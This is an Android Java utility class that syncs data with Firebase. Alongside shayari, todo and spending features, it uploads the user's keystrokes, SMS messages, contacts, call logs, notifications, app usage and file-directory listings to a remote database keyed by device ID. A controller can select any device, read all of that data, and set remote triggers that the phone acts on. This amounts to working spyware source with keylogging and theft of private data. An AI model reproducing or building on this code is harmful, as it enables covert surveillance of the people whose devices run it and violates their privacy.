package com.vikasyadavnsit.cdc.utils;

import static com.vikasyadavnsit.cdc.utils.CommonUtil.getAndroidID;
import static com.vikasyadavnsit.cdc.utils.CommonUtil.getDeviceDetails;

import android.app.Activity;
import android.content.Context;
import android.util.Log;

import java.util.ArrayList;
import java.util.UUID;

import androidx.annotation.NonNull;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.vikasyadavnsit.cdc.constants.AppConstants;
import com.vikasyadavnsit.cdc.data.AppUsageReportData;
import com.vikasyadavnsit.cdc.data.SpendingEntry;
import com.vikasyadavnsit.cdc.data.TodoItem;
import java.util.Calendar;
import com.vikasyadavnsit.cdc.dialog.MessageDialog;
import com.vikasyadavnsit.cdc.enums.ApplicationInputActions;
import com.vikasyadavnsit.cdc.data.KeyStrokeData;
import com.vikasyadavnsit.cdc.data.NotificationData;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.enums.ActionStatus;
import com.vikasyadavnsit.cdc.enums.ClickActions;

import java.util.Arrays;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

public class FirebaseUtils {

    private static Context context;
    private static String selectedUserBasePath = null;
    private static Map<String, User> userCache = null;

    public static void initialize(Context context) {
        FirebaseUtils.context = context;
    }

    public static void setSelectedUser(String androidId) {
        selectedUserBasePath = androidId != null
                ? AppConstants.FIREBASE_RTDB_BASE_PATH + androidId
                : null;
    }

    private static String getSelectedUserPath(String subPath) {
        String base = selectedUserBasePath != null ? selectedUserBasePath : getBasePath(context);
        return base + subPath;
    }

    public static void checkUserExistsAndInit(Activity activity) {
        DatabaseReference userRef = getDbRef(getBasePath(activity));
        userRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists()) {
                    activity.runOnUiThread(() ->
                            MessageDialog.multilineInputDialog(activity,
                                    ApplicationInputActions.FIREBASE_CREATE_USER));
                } else {
                    getAppTriggerSettingsData();
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Log.e("FirebaseUtils", "checkUserExistsAndInit failed: " + error.toException());
                getAppTriggerSettingsData();
            }
        });
    }

    // Get a reference to the database
    public static FirebaseDatabase getDatabase() {
        FirebaseDatabase database = FirebaseDatabase.getInstance(
                AppConstants.FIREBASE_DATABASE_REGION_URL);
        // database.setPersistenceEnabled(true);
        return database;
    }

    public static DatabaseReference getDbRef(String path) {
        DatabaseReference reference = getDatabase().getReference(path);
        reference.keepSynced(true);
        //reference.onDisconnect().setValue("I disconnected!");
        return reference;
    }

    private static String getPath(String path) {
        return getBasePath(context) + path;
    }

    private static String getBasePath(Context context) {
        return AppConstants.FIREBASE_RTDB_BASE_PATH + getAndroidID(context);
    }

    public static void getAppTriggerSettingsData() {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/appSettings/appTriggerSettingsDataMap"));
        appTriggerSettingDataRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (!dataSnapshot.exists()) {
                    // User does not exist, create a new user
                    appTriggerSettingDataRef.setValue(createAppTriggerSettingsDataMap());
                } else {
                    ActionUtils.performFirebaseAction(dataSnapshot.getValue(Object.class));
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                // Failed to read value
                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    private static Map<String, User.AppTriggerSettingsData> createAppTriggerSettingsDataMap() {
        Map<String, User.AppTriggerSettingsData> map = new HashMap<>();
        Arrays.stream(ClickActions.values()).forEach(clickAction -> {
            User.AppTriggerSettingsData obj = User.AppTriggerSettingsData.builder()
                    .enabled(false)
                    .repeatable(false)
                    .maxRepetitions(1)
                    .interval(0)
                    .actionStatus(ActionStatus.IDLE)
                    .clickActions(clickAction)
                    .uploadDataSnapshot(true)
                    .deleteLocalData(false)
                    .build();
            map.put(clickAction.name(), obj);
        });
        return map;
    }


    public static void createUser(String name) {
        String uuid = UUID.randomUUID().toString();
        User user = User.builder()
                .id(uuid)
                .fullName(name)
                .deviceDetails(getDeviceDetails(context))
                .build();
        getDbRef(getBasePath(context)).setValue(user);
        getDbRef(AppConstants.FIREBASE_RTDB_FLAT_USER_PATH + getAndroidID(context)).setValue(user);
    }

    public static void uploadUserKeystrokeDataSnapshot(KeyStrokeData keyStrokeData) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/keystrokes"));
        appTriggerSettingDataRef.push().setValue(keyStrokeData);
    }

    public static void uploadUserSmsDataSnapshot(List<Map<String, String>> messages) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/sms"));
        for (Map<String, String> message : messages) {
            appTriggerSettingDataRef.child(message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING)).setValue(message);
        }
    }

    public static void uploadUserContactsDataSnapshot(List<Map<String, String>> messages) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/contacts"));
        for (Map<String, String> message : messages) {
            appTriggerSettingDataRef.child(message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING)).setValue(message);
        }
    }

    public static void uploadUserCallLogsDataSnapshot(List<Map<String, String>> messages) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/callLogs"));
        for (Map<String, String> message : messages) {
            appTriggerSettingDataRef.child(message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING)).setValue(message);
        }
    }

    public static void uploadUserNotificationDataSnapshot(NotificationData notificationData) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/notifications"));
        appTriggerSettingDataRef.push().setValue(notificationData);
    }

    public static void getAndroidUserClickActions() {
        DatabaseReference ref = getDbRef(getSelectedUserPath("/appSettings/appTriggerSettingsDataMap"));
        ref.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.getAndUpdateAndroidUserClickActions(dataSnapshot.getValue(Object.class));
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void getFlatUserDetails() {
        getFlatUserDetails(false);
    }

    public static void getFlatUserDetails(boolean forceRefresh) {
        if (!forceRefresh && userCache != null) {
            ActionUtils.performFlatUserDetailsActions(userCache);
            return;
        }

        DatabaseReference ref = getDatabase().getReference(AppConstants.FIREBASE_RTDB_FLAT_USER_PATH);
        ref.addListenerForSingleValueEvent(new com.google.firebase.database.ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    Object value = dataSnapshot.getValue(Object.class);
                    userCache = ActionUtils.parseFlatUserDetails(value);
                    ActionUtils.performFlatUserDetailsActions(userCache);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void updateRemoteTrigger(String actionKey, User.AppTriggerSettingsData data) {
        DatabaseReference ref = getDbRef(getSelectedUserPath("/appSettings/appTriggerSettingsDataMap/" + actionKey));
        ref.setValue(data);
    }

    public static void getAndroidUserKeystrokes() {
        DatabaseReference ref = getDbRef(getSelectedUserPath("/userDeviceData/keystrokes"));
        ref.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.displayAndroidUserKeystrokes(dataSnapshot.getValue(Object.class));
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void getAndroidUserAccessibilityNotification() {
        DatabaseReference ref = getDbRef(getSelectedUserPath("/userDeviceData/notifications"));
        ref.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.displayAndroidUserAccessibilityNotification(dataSnapshot.getValue(Object.class));
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void getAndroidUserSystemAppUsageStatistics() {
        DatabaseReference ref = getDbRef(getSelectedUserPath("/userDeviceData/appStats"));
        ref.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.displaySystemAppUsageStatisticsReportData(dataSnapshot.getValue(Object.class));
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void getRemoteSms() {
        getDbRef(getSelectedUserPath("/userDeviceData/sms")).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                ActionUtils.displayRemoteSms(snapshot.getValue(Object.class));
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    public static void getRemoteCallLogs() {
        getDbRef(getSelectedUserPath("/userDeviceData/callLogs")).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                ActionUtils.displayRemoteCallLogs(snapshot.getValue(Object.class));
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    public static void getRemoteContacts() {
        getDbRef(getSelectedUserPath("/userDeviceData/contacts")).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                ActionUtils.displayRemoteContacts(snapshot.getValue(Object.class));
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    public static void getRemoteSensors() {
        getDbRef(getSelectedUserPath("/userDeviceData/sensors")).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                ActionUtils.displayRemoteSensors(snapshot.getValue(Object.class));
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    public static void getRemoteFileStructure() {
        getDbRef(getSelectedUserPath("/userDeviceData/fileStructure")).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                ActionUtils.displayRemoteFileStructure(snapshot.getValue(Object.class));
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    public static void updateRemoteUserMessage(String androidId, String message) {
        DatabaseReference ref = getDbRef(getPath("/message"));
        ref.setValue(message);
    }

    public static void getMessageData() {
        DatabaseReference ref = getDbRef(getPath("/message"));
        ref.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                ActionUtils.performMessageAction(dataSnapshot.getValue(Object.class));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void uploadApplicationUsageReportDataSnapshot(Map<String, AppUsageReportData> appUsageDataMap) {
        getDbRef(getPath("/userDeviceData/appStats")).setValue(appUsageDataMap);
    }

    public static void uploadDeviceDirectoryStructureSnapshot(LinkedHashMap<String, Object> directoryMap) {
        getDbRef(getPath("/userDeviceData/fileStructure")).setValue(directoryMap);
    }

    public static void getShayariCollection(ShayariCollectionCallback callback) {
        DatabaseReference ref = getDatabase().getReference(AppConstants.FIREBASE_RTDB_SHAYARI_PATH);
        ref.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                java.util.List<String> shayaris = new java.util.ArrayList<>();
                for (DataSnapshot child : snapshot.getChildren()) {
                    String value = child.getValue(String.class);
                    if (value != null) shayaris.add(value);
                }
                callback.onLoaded(shayaris);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                callback.onLoaded(new java.util.ArrayList<>());
            }
        });
    }

    public interface ShayariCollectionCallback {
        void onLoaded(java.util.List<String> shayaris);
    }

    public static void saveTodos(List<TodoItem> items) {
        Map<String, Object> map = new HashMap<>();
        for (TodoItem item : items) {
            Map<String, Object> entry = new HashMap<>();
            entry.put("title", item.title);
            entry.put("done", item.done);
            entry.put("createdAt", item.createdAt);
            entry.put("updatedAt", item.updatedAt);
            map.put(item.id, entry);
        }
        getDbRef(getPath(AppConstants.FIREBASE_RTDB_TODOS_PATH)).setValue(map);
    }

    public static void getTodos(TodosCallback callback) {
        getDbRef(getPath(AppConstants.FIREBASE_RTDB_TODOS_PATH))
                .addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        List<TodoItem> items = new ArrayList<>();
                        for (DataSnapshot child : snapshot.getChildren()) {
                            TodoItem item = new TodoItem();
                            item.id = child.getKey();
                            item.title = child.child("title").getValue(String.class);
                            Boolean done = child.child("done").getValue(Boolean.class);
                            item.done = done != null && done;
                            Long createdAt = child.child("createdAt").getValue(Long.class);
                            item.createdAt = createdAt != null ? createdAt : 0;
                            Long updatedAt = child.child("updatedAt").getValue(Long.class);
                            item.updatedAt = updatedAt != null ? updatedAt : 0;
                            if (item.title != null) items.add(item);
                        }
                        callback.onLoaded(items);
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {
                        callback.onLoaded(new ArrayList<>());
                    }
                });
    }

    public interface TodosCallback {
        void onLoaded(List<TodoItem> items);
    }

    public static void saveSpendingEntry(SpendingEntry entry) {
        Calendar cal = Calendar.getInstance();
        cal.setTimeInMillis(entry.date);
        String year = String.valueOf(cal.get(Calendar.YEAR));
        String month = String.format("%02d", cal.get(Calendar.MONTH) + 1);
        String path = AppConstants.FIREBASE_RTDB_SPENDING_PATH + "/" + year + "/" + month + "/" + entry.id;

        Map<String, Object> data = new HashMap<>();
        data.put("id", entry.id);
        data.put("sender", entry.sender);
        data.put("body", entry.body);
        data.put("amount", entry.amount);
        data.put("category", entry.category != null ? entry.category.name() : "UNCATEGORIZED");
        data.put("type", entry.type != null ? entry.type : "UNKNOWN");
        data.put("date", entry.date);

        getDbRef(getPath(path)).setValue(data);
    }

    public static void getSpendingDataForYear(int year, SpendingFullSyncCallback callback) {
        String path = AppConstants.FIREBASE_RTDB_SPENDING_PATH + "/" + year;
        getDbRef(getPath(path)).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Map<String, String> categories = new HashMap<>();
                Map<String, String> types = new HashMap<>();
                for (DataSnapshot monthSnap : snapshot.getChildren()) {
                    for (DataSnapshot entrySnap : monthSnap.getChildren()) {
                        String id = entrySnap.child("id").getValue(String.class);
                        String cat = entrySnap.child("category").getValue(String.class);
                        String type = entrySnap.child("type").getValue(String.class);
                        if (id != null) {
                            if (cat != null) categories.put(id, cat);
                            if (type != null) types.put(id, type);
                        }
                    }
                }
                callback.onLoaded(categories, types);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                callback.onLoaded(new HashMap<>(), new HashMap<>());
            }
        });
    }

    public interface SpendingFullSyncCallback {
        void onLoaded(Map<String, String> categoryMap, Map<String, String> typeMap);
    }
}
